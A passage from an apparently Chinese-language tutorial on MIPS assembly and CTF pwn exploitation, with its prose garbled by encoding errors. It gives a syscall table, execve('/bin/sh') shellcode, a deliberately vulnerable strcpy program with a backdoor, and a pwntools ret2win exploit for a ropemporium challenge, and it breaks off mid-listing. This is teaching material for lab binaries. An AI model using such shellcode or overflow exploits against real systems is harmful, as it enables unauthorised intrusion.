$t0</code></td><td></td></tr><tr><td><strong>ç‰¹æ®Š</strong></td><td><code>syscall</code></td><td>ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡ŒæŒ‡å®šçš„æ“ä½œ</td><td><code>syscall</code></td><td></td></tr><tr><td><strong>ç‰¹æ®Š</strong></td><td><code>break</code></td><td>ç”Ÿæˆæ–­ç‚¹ï¼Œé€šå¸¸ç”¨äºè°ƒè¯•</td><td><code>break</code></td><td></td></tr><tr><td><strong>ç‰¹æ®Š</strong></td><td><code>eret</code></td><td>ä»å¼‚å¸¸ä¸­è¿”å›åˆ°ç”¨æˆ·æ€</td><td><code>eret</code></td><td></td></tr><tr><td><strong>ç‰¹æ®Š</strong></td><td><code>nop</code></td><td>æ— æ“ä½œï¼Œé€šå¸¸ç”¨äºå¡«å……</td><td><code>nop</code></td><td></td></tr></tbody></table><h2 id="å‡½æ•°è°ƒç”¨çº¦å®š"><a href="#å‡½æ•°è°ƒç”¨çº¦å®š" class="headerlink" title="å‡½æ•°è°ƒç”¨çº¦å®š"></a>å‡½æ•°è°ƒç”¨çº¦å®š</h2><p>å¦‚æœå‡½æ•°çš„å‚æ•°å°äºç­‰äºå››ä¸ªï¼Œé‚£ä¹ˆä¼šä½¿ç”¨ <code>$a0-$a3</code> å¯„å­˜å™¨æ¥å­˜æ”¾å‚æ•°ã€‚</p><p>å¦‚æœå‚æ•°å¤šäºå››ä¸ªï¼Œé‚£ä¹ˆå¤šå‡ºæ¥çš„å‚æ•°ä¼šä½¿ç”¨æ ˆè¿›è¡Œä¼ å‚ã€‚</p><p>å‡½æ•° <code>A</code> è°ƒç”¨å‡½æ•° <code>B</code>ã€‚è‹¥ <code>B</code> æ˜¯å¶å­å‡½æ•°ï¼ˆå³ <code>B</code> ä¸è°ƒç”¨å…¶ä»–å‡½æ•°ï¼‰ï¼Œè°ƒç”¨ <code>B</code> æ—¶ä¼šå°†è¿”å›åœ°å€ç›´æ¥å­˜å…¥ <code>$ra</code> å¯„å­˜å™¨ï¼›è‹¥ <code>B</code> æ˜¯éå¶å­å‡½æ•°ï¼ˆå³ <code>B</code> è°ƒç”¨äº†å‡½æ•° <code>C</code>ï¼‰ï¼Œåˆ™åœ¨è·³è½¬åˆ° <code>B</code> æ—¶ï¼Œè¿”å›åœ°å€ä¼šå…ˆå­˜å…¥ <code>$ra</code>ï¼Œç„¶ååœ¨ <code>B</code> å†…éƒ¨å°† <code>$ra</code> çš„å€¼ä¿å­˜åˆ°æ ˆä¸­ã€‚</p><p>å½“ <code>B</code> è°ƒç”¨ <code>C</code> æ—¶ï¼Œ<code>C</code> çš„è¿”å›åœ°å€ä¼šè¦†ç›– <code>$ra</code> çš„å€¼ï¼›è¿”å›æ—¶ï¼Œ<code>jr $ra</code> æŒ‡ä»¤ä¼šè·³å› <code>B</code> çš„è°ƒç”¨ç‚¹ã€‚å¾… <code>B</code> æ‰§è¡Œå®Œæ¯•å‡†å¤‡è¿”å› <code>A</code> æ—¶ï¼Œå®ƒä¼šä»æ ˆä¸­æ¢å¤åŸå§‹çš„è¿”å›åœ°å€åˆ° <code>$ra</code>ï¼Œå†é€šè¿‡ <code>jr $ra</code> è·³å› <code>A</code>ã€‚</p><h2 id="ç³»ç»Ÿè°ƒç”¨"><a href="#ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨"></a>ç³»ç»Ÿè°ƒç”¨</h2><p>åœ¨ x86 çš„ Linux ç³»ç»Ÿä¸­ï¼ŒåŠŸèƒ½å‡½æ•°æ˜¯ç”±ç³»ç»Ÿè°ƒç”¨æ¥å®ç°çš„ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨åŠŸèƒ½å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨æ¥ä½¿ç”¨ç›¸åº”åŠŸèƒ½ã€‚åŒæ ·ï¼Œåœ¨ MIPS æ¶æ„ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨æœºåˆ¶ä¹Ÿç±»ä¼¼ï¼Œé€šè¿‡ <code>syscall</code> æŒ‡ä»¤è§¦å‘ã€‚MIPS çš„ç³»ç»Ÿè°ƒç”¨å®ç°æ–¹å¼ä¸åŒäº x86ï¼Œä½†åŸºæœ¬åŸç†ç›¸åŒï¼šé€šè¿‡è§¦å‘ä¸­æ–­ä¸å†…æ ¸è¿›è¡Œäº¤äº’ã€‚</p><ul><li>ç³»ç»Ÿè°ƒç”¨å·ï¼šåœ¨ MIPS ä¸­ <code>$v0</code> å¯„å­˜å™¨ç”¨äºå­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·ã€‚</li><li>å‚æ•°ï¼šç³»ç»Ÿè°ƒç”¨çš„å‚æ•°é€šå¸¸å­˜å‚¨åœ¨ <code>$a0</code> åˆ° <code>$a3</code> å¯„å­˜å™¨ä¸­ï¼Œæœ€å¤šå¯ä»¥æœ‰ 4 ä¸ªå‚æ•°ã€‚</li><li>è¿”å›å€¼ï¼šç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼é€šå¸¸å­˜å‚¨åœ¨ <code>$v0</code> å’Œ <code>v1</code> å¯„å­˜å™¨ä¸­ã€‚</li></ul><blockquote><p>æ³¨ï¼šåœ¨ MIPS æ¶æ„ä¸‹ï¼Œç³»ç»Ÿè°ƒç”¨å·å¯èƒ½å› æ“ä½œç³»ç»Ÿè€Œå¼‚ã€‚</p></blockquote><p>ä»¥ä¸‹æ˜¯åŸºäº Linux MIPS ABI çš„ä¸€äº›å¸¸ç”¨ç³»ç»Ÿè°ƒç”¨åŠå…¶åŠŸèƒ½ï¼š</p><table><thead><tr><th><strong>ç³»ç»Ÿè°ƒç”¨å·</strong></th><th><strong>åç§°</strong></th><th><strong>åŠŸèƒ½è¯´æ˜</strong></th></tr></thead><tbody><tr><td>4001</td><td><code>exit</code></td><td>é€€å‡ºç¨‹åºï¼Œå‚æ•°æ˜¯é€€å‡ºçŠ¶æ€ç </td></tr><tr><td>4003</td><td><code>read</code></td><td>ä»æ–‡ä»¶æè¿°ç¬¦è¯»å–æ•°æ®</td></tr><tr><td>4004</td><td><code>write</code></td><td>å‘æ–‡ä»¶æè¿°ç¬¦å†™å…¥æ•°æ®</td></tr><tr><td>4005</td><td><code>open</code></td><td>æ‰“å¼€æ–‡ä»¶</td></tr><tr><td>4006</td><td><code>close</code></td><td>å…³é—­æ–‡ä»¶æè¿°ç¬¦</td></tr><tr><td>4009</td><td><code>link</code></td><td>åˆ›å»ºç¡¬é“¾æ¥</td></tr><tr><td>4010</td><td><code>unlink</code></td><td>åˆ é™¤æ–‡ä»¶</td></tr><tr><td>4011</td><td><code>execve</code></td><td>æ‰§è¡Œæ–°ç¨‹åº</td></tr><tr><td>4012</td><td><code>chdir</code></td><td>æ”¹å˜å½“å‰å·¥ä½œç›®å½•</td></tr><tr><td>4013</td><td><code>time</code></td><td>è·å–å½“å‰æ—¶é—´</td></tr><tr><td>4014</td><td><code>mknod</code></td><td>åˆ›å»ºç‰¹æ®Šæ–‡ä»¶</td></tr><tr><td>4015</td><td><code>chmod</code></td><td>ä¿®æ”¹æ–‡ä»¶æƒé™</td></tr><tr><td>4016</td><td><code>lseek</code></td><td>æ–‡ä»¶æŒ‡é’ˆå®šä½</td></tr><tr><td>4017</td><td><code>getpid</code></td><td>è·å–å½“å‰è¿›ç¨‹ ID</td></tr><tr><td>4020</td><td><code>getuid</code></td><td>è·å–ç”¨æˆ· ID</td></tr><tr><td>4021</td><td><code>geteuid</code></td><td>è·å–æœ‰æ•ˆç”¨æˆ· ID</td></tr><tr><td>4022</td><td><code>getgid</code></td><td>è·å–ç»„ ID</td></tr><tr><td>4023</td><td><code>getegid</code></td><td>è·å–æœ‰æ•ˆç»„ ID</td></tr><tr><td>4024</td><td><code>ptrace</code></td><td>è°ƒè¯•å·¥å…·æ¥å£</td></tr><tr><td>4037</td><td><code>kill</code></td><td>å‘è¿›ç¨‹å‘é€ä¿¡å·</td></tr><tr><td>4038</td><td><code>uname</code></td><td>è·å–ç³»ç»Ÿä¿¡æ¯</td></tr><tr><td>4040</td><td><code>mkdir</code></td><td>åˆ›å»ºç›®å½•</td></tr><tr><td>4041</td><td><code>rmdir</code></td><td>åˆ é™¤ç›®å½•</td></tr><tr><td>4042</td><td><code>dup</code></td><td>å¤åˆ¶æ–‡ä»¶æè¿°ç¬¦</td></tr><tr><td>4045</td><td><code>brk</code></td><td>è°ƒæ•´è¿›ç¨‹æ•°æ®æ®µçš„å¤§å°ï¼ˆåˆ†é…å †å†…å­˜ï¼‰</td></tr><tr><td>4057</td><td><code>socket</code></td><td>åˆ›å»ºå¥—æ¥å­—</td></tr><tr><td>4066</td><td><code>gettimeofday</code></td><td>è·å–æ—¶é—´å’Œæ—¶åŒº</td></tr><tr><td>4083</td><td><code>bind</code></td><td>ç»‘å®šå¥—æ¥å­—</td></tr><tr><td>4085</td><td><code>listen</code></td><td>ç›‘å¬è¿æ¥</td></tr><tr><td>4086</td><td><code>accept</code></td><td>æ¥å—è¿æ¥</td></tr></tbody></table><h2 id="æ±‡ç¼–Lab"><a href="#æ±‡ç¼–Lab" class="headerlink" title="æ±‡ç¼–Lab"></a>æ±‡ç¼–Lab</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><p>æˆ‘ä»¬é€šè¿‡ç¼–å†™ç»å…¸ç¨‹åº <code>Hello World</code> ä½œä¸ºæˆ‘ä»¬ MIPS æ±‡ç¼– Lab çš„å¼€å§‹ã€‚</p><p>ä»£ç ä¸­ <code>.section</code> ç”¨äºå®šä¹‰æ®µï¼Œæˆ‘ä»¬ç”¨å®ƒå®šä¹‰äº† <code>.text</code> æ®µå’Œ <code>.data</code> æ®µã€‚</p><p>æˆ‘ä»¬å£°æ˜äº†ä¸€ä¸ªæ ‡ç­¾ <code>msg</code>ï¼Œå®ƒæ˜¯ <code>Hello World!</code> çš„åœ°å€ã€‚</p><p><code>.asciiz</code> ç”¨äºå®šä¹‰ä¸€ä¸ªä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚</p><p><code>.set noreorder</code> ç”¨äºç¦æ­¢æŒ‡ä»¤é‡æ’åºã€‚</p><p><code>.global __start</code> ç”¨äºå°† <code>__start</code> å®šä¹‰ä¸ºå…¨å±€ç¬¦å·ï¼Œæ˜¯ç¨‹åºçš„å…¥å£ç‚¹ã€‚æˆ‘ä»¬é€šè¿‡ <code>__start</code> å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œä»è¿™é‡Œå¼€å§‹æ‰§è¡Œä»£ç ã€‚</p><p>ç„¶åæˆ‘ä»¬é€šè¿‡è®¾ç½® <code>write</code> ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æœ€åè§¦å‘ä¸­æ–­è¾“å‡º <code>Hello World!</code>ã€‚</p><p>ç„¶åé€šè¿‡æ‰§è¡Œ <code>exit</code> ç³»ç»Ÿè°ƒç”¨è®©ç¨‹åºæ­£å¸¸é€€å‡ºã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.data</span><br><br>msg: <span class="hljs-selector-class">.asciiz</span> <span class="hljs-string">&quot;Hello World!&quot;</span><br><br><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.text</span><br><span class="hljs-selector-class">.set</span> noreorder<br><span class="hljs-selector-class">.global</span> __start<br><br>__start:<br><br>la <span class="hljs-variable">$a0</span>,<span class="hljs-number">0</span><br>la <span class="hljs-variable">$a1</span>,msg<br>la <span class="hljs-variable">$a2</span>,<span class="hljs-number">13</span><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$v0</span>,<span class="hljs-number">4004</span><br>syscall<br><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$v0</span>,<span class="hljs-number">4001</span><br>syscall<br></code></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>shellcode å³ä¸€æ®µå¯ä»¥è·å–åˆ° shell çš„æ±‡ç¼–ä»£ç ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ <code>execve</code> ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œ <code>/bin/sh</code> è·å–ä¸€ä¸ª shellã€‚</p><p>ç”±äºæˆ‘ä»¬æ‰§è¡Œä¹‹åä¼šç›´æ¥å¼¹å‡ºä¸€ä¸ª shellï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦ä½¿ç”¨ <code>exit</code> è®©ç¨‹åºæ­£å¸¸é€€å‡ºã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.data</span><br>sh: <span class="hljs-selector-class">.asciiz</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br><br><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.text</span><br><span class="hljs-selector-class">.global</span> __start<br><br><span class="hljs-selector-class">.set</span> noreorder<br><br>__start:<br>la <span class="hljs-variable">$a0</span>,sh<br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$a1</span>,<span class="hljs-number">0</span><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$a2</span>,<span class="hljs-number">0</span><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$v0</span>,<span class="hljs-number">4011</span><br>syscall<br></code></pre></td></tr></table></figure><p><img src="/assets/Pasted%20image%2020241127190813.png"></p><p>MIPS åœ¨ pwn ä¸­çš„ç‰¹ç‚¹ï¼š</p><ul><li>MIPS ä¸æ”¯æŒ NX ä¿æŠ¤ï¼Œæ‰€ä»¥ ret2shellcode æ˜¯æœ€å¸¸è§çš„åˆ©ç”¨æ–¹å¼</li><li>æº¢å‡ºæ§åˆ¶<code>$ra</code>å¯„å­˜å™¨ç›´æ¥è·³è½¬åˆ° shellcode å¤„</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span>&#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">has_stack</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span><br>&#123;<br>        <span class="hljs-type">char</span> dst[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-built_in">strcpy</span>(dst,src);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;copy successfully&quot;</span>);<br>&#125;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>        has_stack(argv[<span class="hljs-number">1</span>]);<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ä»£ç  mipsel-linux-gnu-gcc vuln.c -o vuln</p><p>åŠ¨æ€è°ƒè¯• qemu-mipsel -g 8888 .&#x2F;vuln AAAAA</p><p>IDAè¿æ¥ä¸Šå¯¹åº”çš„è¿›ç¨‹ï¼Œå³å¯è¿›è¡ŒåŠ¨æ€è°ƒè¯•</p><p><img src="/assets/Pasted%20image%2020241209212922.png"></p><ol start="9"><li>MIPS32æ¶æ„ä¸­æ˜¯æ²¡æœ‰ EBP å¯„å­˜å™¨çš„ï¼Œç¨‹åºå‡½æ•°è°ƒç”¨çš„æ—¶å€™æ˜¯å°†å½“å‰æ ˆæŒ‡é’ˆå‘ä¸‹ç§»åŠ¨ n æ¯”ç‰¹åˆ°è¯¥å‡½æ•°çš„ stack frame å­˜å‚¨ç»„ç©ºé—´ï¼Œå‡½æ•°è¿”å›çš„æ—¶å€™å†åŠ ä¸Šåç§»é‡æ¢å¤æ ˆã€‚</li><li>ä¼ å‚è¿‡ç¨‹ä¸­ï¼Œå‰å››ä¸ªå‚æ•°<code>a0-a3</code>ï¼Œå¤šä½™çš„ä¼šä¿å­˜åœ¨è°ƒç”¨å‡½æ•°çš„é¢„ç•™çš„æ ˆé¡¶ç©ºé—´å†…ã€‚</li><li>MIPS è°ƒç”¨å‡½æ•°æ—¶ä¼šæŠŠå‡½æ•°çš„è¿”å›åœ°å€ç›´æ¥å­˜å…¥<code>$RA</code>å¯„å­˜å™¨ã€‚</li></ol><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="ropemporium"><a href="#ropemporium" class="headerlink" title="ropemporium"></a>ropemporium</h3><p>wiki ä¸Šçš„ä¸€é“ç®€å•é¢˜ï¼Œå¾ˆé€‚åˆå…¥é—¨ï¼Œåªéœ€è¦æ‡‚å¾— mips æ±‡ç¼–å°±è¡Œäº†ã€‚</p><p>äº‹å®ä¸Šåœ¨ ida9 æ³„éœ²ä¹‹åï¼Œ</p><p>ida æ‰“å¼€åˆ†æï¼Œè¿›å…¥<code>pwnme</code>å…³é”®å‡½æ•°ã€‚</p><p>å‡½æ•°å¼€å§‹å°†<code>ra</code>å¯„å­˜å™¨çš„å€¼ï¼Œæ”¾å…¥<code>$sp+60</code>çš„ä½ç½®é‡Œã€‚å³è¿”å›åœ°å€ä½äº<code>$sp+60</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, -<span class="hljs-number">0x40</span><br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x38</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x38</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">fp</span>, $<span class="hljs-built_in">sp</span><br>li      $<span class="hljs-built_in">gp</span>, (_GLOBAL_OFFSET_TABLE_+<span class="hljs-number">0x7FF0</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x38</span>+var_28($<span class="hljs-built_in">sp</span>)<br>li      $<span class="hljs-built_in">a2</span>, <span class="hljs-number">0x20</span>  <span class="hljs-comment"># &#x27; &#x27;  # n</span><br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a1</span>, $<span class="hljs-built_in">zero</span>       <span class="hljs-comment"># c</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">v0</span>, $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x38</span>+var_20<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">v0</span>         <span class="hljs-comment"># s</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çœ‹å‡½æ•°ä¸­çš„<code>read</code>å‡½æ•°ï¼Œ<code>a2</code>ä¸ºè¯»å–çš„å†…å®¹å¤§å°ï¼Œå°†è¢«å¤åˆ¶ä¸º 0x38ï¼Œ<code>buf</code>ä¸ºä½äº<code>$sp+0x18</code>çš„ä½ç½®ï¼Œæ˜æ˜¾çš„ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œä¸”èƒ½è¦†ç›–è¿”å›åœ°å€ã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x38</span>+var_28($<span class="hljs-built_in">fp</span>)<br>li      $<span class="hljs-built_in">a2</span>, <span class="hljs-number">0x38</span>  <span class="hljs-comment"># &#x27;8&#x27;  # nbytes</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">v0</span>, $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x38</span>+var_20<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a1</span>, $<span class="hljs-built_in">v0</span>         <span class="hljs-comment"># buf</span><br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">zero</span>       <span class="hljs-comment"># fd</span><br>la      $<span class="hljs-built_in">v0</span>, read<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">v0</span><br><span class="hljs-keyword">jalr </span>   $<span class="hljs-built_in">t9</span> <span class="hljs-comment">; read</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡è®¡ç®—ï¼Œå¯ä»¥è®¡ç®—å‡ºå¡«å……çš„é•¿åº¦ä¸º 36ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">60</span>-<span class="hljs-number">0</span>x18=<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åœ¨å‡½æ•°<code>ret2win</code>ä¸­å‘ç°äº†åé—¨å‡½æ•°</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">ret2win:</span><br><br>var_8= -<span class="hljs-number">8</span><br>var_s0=  <span class="hljs-number">0</span><br>var_s4=  <span class="hljs-number">4</span><br><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, -<span class="hljs-number">0x20</span><br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">fp</span>, $<span class="hljs-built_in">sp</span><br>li      $<span class="hljs-built_in">gp</span>, (_GLOBAL_OFFSET_TABLE_+<span class="hljs-number">0x7FF0</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x18</span>+var_8($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">lui </span>    $<span class="hljs-built_in">v0</span>, <span class="hljs-number">0x40</span>  <span class="hljs-comment"># &#x27;@&#x27;</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">v0</span>, (aWellDoneHereSY - <span class="hljs-number">0x400000</span>)  <span class="hljs-comment"># &quot;Well done! Here&#x27;s your flag:&quot;</span><br>la      $<span class="hljs-built_in">v0</span>, puts<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">v0</span><br><span class="hljs-keyword">jalr </span>   $<span class="hljs-built_in">t9</span> <span class="hljs-comment">; puts</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x18</span>+var_8($<span class="hljs-built_in">fp</span>)<br><span class="hljs-keyword">lui </span>    $<span class="hljs-built_in">v0</span>, <span class="hljs-number">0x40</span>  <span class="hljs-comment"># &#x27;@&#x27;</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">v0</span>, (aBinCatFlagTxt - <span class="hljs-number">0x400000</span>)  <span class="hljs-comment"># &quot;/bin/cat flag.txt&quot;</span><br>la      $<span class="hljs-built_in">v0</span>, system<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">v0</span><br><span class="hljs-keyword">jalr </span>   $<span class="hljs-built_in">t9</span> <span class="hljs-comment">; system</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x18</span>+var_8($<span class="hljs-built_in">fp</span>)<br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">sp</span>, $<span class="hljs-built_in">fp</span><br><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, <span class="hljs-number">0x20</span><br><span class="hljs-keyword">jr </span>     $<span class="hljs-built_in">ra</span><br><span class="hljs-keyword">nop</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥å°†è¿”å›åœ°å€è¦†ç›–ä¸º<code>ret2win</code>å‡½æ•°çš„åœ°å€å³å¯<code>cat flag</code></p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch=<span class="hljs-string">&#x27;mips&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#è®¾ç½®åŠ è½½mipsæ¶æ„ç¨‹åºçš„ç¯å¢ƒ</span><br>io = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/mipsel-linux-gnu/&quot;</span>,<span class="hljs-string">&quot;./ret2win_mipsel&quot;</span>])<br>elf = ELF(<span class="hljs-string">&quot;./ret2win_mipsel&quot;</span>)<br>io.recv()<br>backdoor=<span class="hljs-number">0x0400a00</span><br>pay=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">36</span>+p32(backdoor)<br>io.sendline(pay)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h3><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 